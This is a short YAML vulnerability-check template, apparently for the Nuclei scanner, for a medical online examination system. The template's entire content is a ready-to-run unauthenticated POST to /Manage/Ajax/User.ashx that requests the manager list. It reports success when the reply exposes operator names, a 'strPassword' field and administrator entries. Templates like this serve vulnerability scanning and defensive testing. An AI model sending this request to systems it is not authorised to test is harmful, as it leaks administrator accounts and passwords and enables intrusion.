id: poc-yaml-yq-moes-user-info-leak
info:
  name: 医学在线考试系统 User 信息泄露漏洞
  author: ProjectDiscoveryAI
  severity: medium
  tags: 信息泄露
http:
  - raw:
      - |
        POST /Manage/Ajax/User.ashx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        oper=getManagerList&name=&code=&depart=&page=1&rows=15
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"strOperatorName":'
          - '"strPassword":'
          - 管理员
      - type: word
        words:
          - '<html>'
        negative: true
        part: body
